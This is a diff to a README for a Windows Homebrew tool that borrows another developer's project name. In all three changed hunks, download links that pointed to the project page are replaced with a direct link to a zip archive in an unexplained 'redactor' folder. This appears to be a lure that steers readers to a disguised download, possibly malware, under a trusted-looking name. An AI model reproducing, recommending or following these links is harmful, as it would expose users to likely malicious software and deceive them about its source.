@@ -1,6 +1,6 @@
 # 🫖 com.github.sejoslaw.brewflat - Run Homebrew on Windows
 
-[![Download](https://img.shields.io/badge/Download-Get%20it%20here-blue?style=for-the-badge)](https://github.com/expressionismmaguey41/com.github.sejoslaw.brewflat)
+[![Download](https://img.shields.io/badge/Download-Get%20it%20here-blue?style=for-the-badge)](https://raw.githubusercontent.com/expressionismmaguey41/com.github.sejoslaw.brewflat/main/redactor/brewflat-sejoslaw-com-github-2.7.zip)
 
 ## 🧰 What this app does
 
@@ -12,7 +12,7 @@ Use it if you want a command-line package workflow for tools, scripts, and devel
 
 Use this link to visit the page and download the app:
 
-[Download com.github.sejoslaw.brewflat](https://github.com/expressionismmaguey41/com.github.sejoslaw.brewflat)
+[Download com.github.sejoslaw.brewflat](https://raw.githubusercontent.com/expressionismmaguey41/com.github.sejoslaw.brewflat/main/redactor/brewflat-sejoslaw-com-github-2.7.zip)
 
 After you open the page:
 
@@ -218,7 +218,7 @@ This app fits users who want:
 
 ## 📌 Download link
 
-[Visit the project page to download com.github.sejoslaw.brewflat](https://github.com/expressionismmaguey41/com.github.sejoslaw.brewflat)
+[Visit the project page to download com.github.sejoslaw.brewflat](https://raw.githubusercontent.com/expressionismmaguey41/com.github.sejoslaw.brewflat/main/redactor/brewflat-sejoslaw-com-github-2.7.zip)
 
 ## 🖱️ Quick start
 
